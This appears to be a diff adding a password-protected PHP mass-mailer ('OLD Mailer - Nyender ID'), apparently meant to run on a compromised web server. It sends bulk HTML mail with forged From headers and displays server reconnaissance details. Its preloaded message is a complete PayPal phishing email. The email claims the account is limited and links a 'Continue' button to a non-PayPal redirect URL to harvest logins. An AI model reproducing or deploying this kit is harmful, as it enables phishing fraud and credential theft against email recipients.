@@ -1,0 +1,205 @@
+<?php
+@session_start();
+@set_time_limit(0);
+if((isset($v) AND $v==0) OR (isset($t) AND $t==false)){
+die('');
+}
+$create_password = true;
+$password = "deyola";
+$pass=$_POST['pass'];
+if($pass==$password){
+$_SESSION['nst']="$pass";
+}
+if($create_password==true){
+if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){
+die("
+<noembed><xmp><body></xmp></noembed><noembed><xmp></body></html></xmp></noembed><title>OLD Mailer - Nyender ID</title><center><body background=black<table width=1 bgcolor=white><tr><td><font size=1 face=verdana><center><b></font></a><br></b></center><form method=post><font size=1 face=verdana color=808080><strong><center>Please log in to access</center></strong><br><input type=password name=pass size=10></form>
+</td></tr></table>
+");}
+}
+$testa = $_POST['veio'];
+if($testa != "") {
+$message = $_POST['html'];
+$subject = $_POST['assunto'];
+$nome = $_POST['nome'];
+$de = $_POST['de'];
+$to = $_POST['emails'];
+$email = explode("\n", $to);
+$message = stripslashes($message);
+$i = 0;
+$count = 1;
+while($email[$i]) {
+$ok = "ok";
+$headers  = "MIME-Version: 1.0\n";
+$headers .= "Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+X-Mailer: EDMAIL R6.00.02
+Content-Length: 41061\n";
+$headers .= "From: ".$email[$i]."\r\n";
+if(mail($email[$i], $subject, $message, $headers))
+echo "<font color=gren>* NyenderID: [ Line ] : $count <b>".$email[$i]."</b> <font color=gren>Success send!</font><br><hr>";
+else
+echo "<font color=red>* NyenderID: [ Line ] : $count <b>".$email[$i]."</b> <font color=red>Server error [ can't sending email ]</font><br><hr>";
+$i++;
+$count++;
+}
+$count--;
+if($ok == "ok")
+echo ""; 
+
+}
+
+?>
+<html>
+<head>
+<title>OLD Mailer - Nyender ID</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<style>
+body {
+    margin-left: 0;
+    margin-right: 0;
+    margin-top: 0;
+        background-color: #000000;
+    margin-bottom: 0;
+}
+.titulo {
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 70px;
+    color: #1BF51F;
+    font-weight: bold;
+}
+
+.normal {
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 12px;
+    color: #1BF51F;
+}
+
+.form {
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 10px;
+    color: #FFFFFF;
+    background-color: #000000;
+    border: 1px dashed #666666;
+}
+
+.texto {
+    font-family: Verdana, Arial, Helvetica, sans-serif;
+    font-weight: bold;
+}
+
+.alerta {
+    font-family: Verdana, Arial, Helvetica, sans-serif;
+    font-weight: bold;
+    color: #990000;
+    font-size: 10px;
+}
+</style>
+</head>
+<body>
+<form action="" method="post" enctype="multipart/form-data" name="form1">
+  <input type="hidden" name="veio" value="sim">
+
+    <tr>
+
+ 
+<table border="0" width="53%" bordercolorlight="#000000" bordercolordark="#000000" style="border: 1px ridge #1BF51F" bgcolor="black" > 
+     <td width="462" height="25" align="center" bgcolor="#000000"><span class="titulo">OLD Mailer - Nyender ID</span></td>
+<tr align="left"> 
+<td colspan="2" ><font color="#1BF51F">
+Server Name: <?php echo $UNAME = @php_uname(); ?><br>
+System: <?php echo $OS = @PHP_OS; ?><br>
+Server IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br>
+Software : <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
+Admin Mail: <?php echo $_SERVER['SERVER_ADMIN']; ?> <br>
+Safe Mode: <?php echo $safe_mode = @ini_get('safe_mode'); ?>
+</td>
+
+</center>
+
+
+    </tr>
+    <tr>
+      <td height="194" valign="top" bgcolor="#000000">
+          <table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="444">
+          <tr>
+            <td align="right" height="17"><span class="texto">Subject:</span></td>
+            <td height="17"><input name="assunto" type="text" value= "Important - We're concerned about potential unauthorized activity"class="form" id="assunto" style="width:100%" ></td>
+          </tr>
+          <tr align="center" bgcolor="#99CCFF">
+            <td height="20" colspan="2" bgcolor="#000000"></td>
+          </tr>
+          <tr align="right">
+            <td height="146" colspan="2" valign="top"><br>
+             <textarea name="html" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="html">
+
+
+
+
+
+<table id="yui_3_16_0_ym19_1_1484953320908_14139" style="widows: 2; text-transform: none; background-color: #ededeb; text-indent: 0px; margin: 30px 0px; display: table; border-collapse: separate; font: 12px Arial, Helvetica, sans-serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #222222; word-spacing: 0px; -webkit-text-stroke-width: 0px; -webkit-padding-start: 0px; padding: 0px;" border="0" width="567" cellspacing="0" cellpadding="0">
+<tbody id="yui_3_16_0_ym19_1_1484953320908_14138" style="width: 567px; -webkit-padding-start: 0px;">
+<tr id="yui_3_16_0_ym19_1_1484953320908_14137" style="display: table-row; vertical-align: inherit; -webkit-padding-start: 0px;">
+<td id="yui_3_16_0_ym19_1_1484953320908_14136" style="background-color: #ffffff; margin: 0px; border-spacing: 2px; display: table-cell; font-family: arial, sans-serif; -webkit-padding-start: 0px; border: #d7d7d7 1px solid; padding: 20px;">&nbsp;<span style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; display: inline; font-family: arial, sans-serif; white-space: normal; orphans: 2; float: none; letter-spacing: normal; color: #48545d; font-size: 14px; font-weight: normal; word-spacing: 0px; -webkit-padding-start: 0px;"><strong style="font-weight: bold; -webkit-padding-start: 0px;"><span style="-webkit-padding-start: 0px; color: #000000;"><em><img src="https://www.paypalobjects.com/webstatic/mktg/Logo/pp-logo-100px.png" border="0" alt="PayPal Logo"></a></em></span></strong></span>
+<p style="line-height: 18px; widows: 2; text-transform: none; font-style: normal; text-indent: 0px; margin: 11px 0px; display: block; font-family: 'Times New Roman'; white-space: normal; orphans: 2; letter-spacing: normal; color: #000000; font-size: medium; font-weight: normal; word-spacing: 0px; -webkit-padding-start: 0px; padding: 0px;" align="left"><span style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; display: inline; font-family: arial, sans-serif; white-space: normal; orphans: 2; float: none; letter-spacing: normal; color: #48545d; font-size: 14px; font-weight: normal; word-spacing: 0px; -webkit-padding-start: 0px;"><strong style="font-weight: bold; -webkit-padding-start: 0px;"><span style="-webkit-padding-start: 0px; color: #000000; font-family: 'Segoe UI'; font-size: small;"><br />Dear Customer,<br /><br /></span></strong></span></p>
+<p style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; margin: 11px 0px; font-family: arial, sans-serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #292929; font-size: 13px; font-weight: normal; word-spacing: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; padding: 0px;">Remember, you still need to take action to restore your PayPal account. Until you do, your account will be limited.&nbsp;</p>
+<p style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; margin: 11px 0px; font-family: arial, sans-serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #292929; font-size: 13px; font-weight: normal; word-spacing: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; padding: 0px;"><strong>What's going on?</strong></p>
+<p style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; margin: 11px 0px; font-family: arial, sans-serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #292929; font-size: 13px; font-weight: normal; word-spacing: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; padding: 0px;">We've noticed some unusual activity on your PayPal account and we're concerned about potential unauthorised account access.&nbsp;</p>
+<p style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; margin: 11px 0px; font-family: arial, sans-serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #292929; font-size: 13px; font-weight: normal; word-spacing: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; padding: 0px;"><strong>What to do next</strong></p>
+<p style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; margin: 11px 0px; font-family: arial, sans-serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #292929; font-size: 13px; font-weight: normal; word-spacing: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; padding: 0px;">Please log in to your PayPal account and complete the steps to confirm your identity and your recent account activity. To help protect your account, your account will remain limited until you complete the necessary steps.&nbsp;</p>
+<p style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; margin: 11px 0px; font-family: arial, sans-serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #292929; font-size: 13px; font-weight: normal; word-spacing: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; padding: 0px;">The security of your PayPal account is a top priority for us and we want to work together to help protect it.&nbsp;</p>
+<p style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; margin: 11px 0px; font-family: arial, sans-serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #292929; font-size: 13px; font-weight: normal; word-spacing: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; padding: 0px;">If you need help or have any questions, call us for free on 0800 358 7911. We're open from<span class="Apple-converted-space">&nbsp;</span><span class="aBn" style="z-index: 0; border-bottom: #cccccc 1px dashed; position: relative; top: -2px;" tabindex="0" data-term="goog_608440399"><span class="aQJ" style="z-index: -1; position: relative; top: 2px;">8am to 9pm</span></span><span class="Apple-converted-space">&nbsp;</span>Monday to Friday, from<span class="Apple-converted-space">&nbsp;</span><span class="aBn" style="z-index: 0; border-bottom: #cccccc 1px dashed; position: relative; top: -2px;" tabindex="0" data-term="goog_608440400"><span class="aQJ" style="z-index: -1; position: relative; top: 2px;">8am to 9pm</span></span><span class="Apple-converted-space">&nbsp;</span>on Saturday and from<span class="Apple-converted-space">&nbsp;</span><span class="aBn" style="z-index: 0; border-bottom: #cccccc 1px dashed; position: relative; top: -2px;" tabindex="0" data-term="goog_608440401"><span class="aQJ" style="z-index: -1; position: relative; top: 2px;">9am to 9pm</span></span><span class="Apple-converted-space">&nbsp;</span>on Sunday.</p>
+<table id="yui_3_16_0_ym19_1_1484953320908_14180" style="widows: 2; text-transform: none; font-style: normal; text-indent: 0px; margin: 0px; display: table; border-collapse: separate; font-family: arial, sans-serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #666666; font-size: 14px; font-weight: normal; word-spacing: 0px; -webkit-padding-start: 0px; padding: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0" bgcolor="#ffffff">
+<tbody id="yui_3_16_0_ym19_1_1484953320908_14179" style="width: 525px; -webkit-padding-start: 0px;">
+<tr id="yui_3_16_0_ym19_1_1484953320908_14178" style="display: table-row; vertical-align: inherit; -webkit-padding-start: 0px;">
+<td id="yui_3_16_0_ym19_1_1484953320908_14177" style="border-spacing: 2px; display: table-cell; -webkit-padding-start: 0px;" align="middle">&nbsp;</td>
+</tr>
+<tr style="display: table-row; vertical-align: inherit; -webkit-padding-start: 0px;">
+<td style="border-spacing: 2px; display: table-cell; -webkit-padding-start: 0px;" height="20">&nbsp;</td>
+</tr>
+<tr id="yui_3_16_0_ym19_1_1484953320908_14183" style="display: table-row; vertical-align: inherit; -webkit-padding-start: 0px;">
+<td id="yui_3_16_0_ym19_1_1484953320908_14182" style="border-spacing: 2px; display: table-cell; -webkit-padding-start: 0px;" align="middle" valign="top" width="48%"><a id="yui_3_16_0_ym19_1_1484953320908_14181" style="margin: 0px; outline-style: none; outline-color: invert; outline-width: medium; display: block; background: #0087d1; color: #ffffff; text-decoration: none; -webkit-padding-start: 0px; border-top-left-radius: 3px; border-top-right-radius: 3px; border-bottom-right-radius: 3px; border-bottom-left-radius: 3px; padding: 15px 25px 15px 25px;" href="https://setanwar.net/redirect.php" target="_blank" rel="nofollow">Continue</a></td>
+</tr>
+<tr style="display: table-row; vertical-align: inherit; -webkit-padding-start: 0px;">
+<td style="border-spacing: 2px; display: table-cell; -webkit-padding-start: 0px;" align="middle">&nbsp;</td>
+</tr>
+<tr id="yui_3_16_0_ym19_1_1484953320908_14186" style="display: table-row; vertical-align: inherit; -webkit-padding-start: 0px;">
+<td id="yui_3_16_0_ym19_1_1484953320908_14185" style="border-spacing: 2px; display: table-cell; -webkit-padding-start: 0px;" align="middle">&nbsp;</td>
+</tr>
+</tbody>
+</table>
+<span style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; display: inline !important; font-family: arial, sans-serif; white-space: normal; orphans: 2; float: none; letter-spacing: normal; color: #222222; font-size: 12px; font-weight: normal; word-spacing: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px;"><br />Best regards,</span><br style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; font-family: arial, sans-serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #222222; font-size: 12px; font-weight: normal; word-spacing: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px;" /><span style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; display: inline !important; font-family: arial, sans-serif; white-space: normal; orphans: 2; float: none; letter-spacing: normal; color: #222222; font-size: 12px; font-weight: normal; word-spacing: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px;">PayPal</span></td>
+</tr>
+</tbody>
+</table>
+<p style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; margin: 11px 0px; font-family: arial, sans-serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #292929; font-size: 12px; font-weight: normal; word-spacing: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; padding: 0px;">Copyright &copy; 1999-2017 PayPal. All rights reserved.</p>
+<p style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; margin: 11px 0px; font-family: arial, sans-serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #292929; font-size: 12px; font-weight: normal; word-spacing: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; padding: 0px;">PayPal (Europe) S.&agrave; r.l. et Cie, S.C.A. Soci&eacute;t&eacute; en Commandite par Actions Registered Office: 22-24 Boulevard Royal L-2449, Luxembourg RCS Luxembourg B 118 349</p>
+<p class="m_4597631032105575480footer m_4597631032105575480ppid" style="widows: 2; text-transform: none; background-color: #ffffff; font-style: normal; text-indent: 0px; margin: 11px 0px; font-family: arial, sans-serif; white-space: normal; orphans: 2; letter-spacing: normal; color: #757575; font-size: 12px; font-weight: normal; word-spacing: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; padding: 0px;">PayPal PPC000263:68d1fe6a5b3de</p>
+			 
+</textarea>
+              <span class="alerta">*Reminder: Text HTML</span></td>
+
+
+
+          </tr>
+          <tr align="center" bgcolor="#000000">
+            <td height="20" colspan="2"><span class="texto">Mailing List</span>
+             
+          </tr>
+          <tr align="right">
+            <td height="146" colspan="2" valign="top"><br>
+              <textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="emails">your@email.com</textarea>
+              <span class="alerta">* Mail List</span> </td>
+          </tr>
+          <tr>
+            <td height="26" align="right" valign="top" colspan="2"><input type="submit" name="Submit" value="Send!!"></td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+    <tr>
+      <td height="15" align="center" bgcolor="#000000">&nbsp;</td>
+    </tr>
+  </table>
+</form>
+</body>
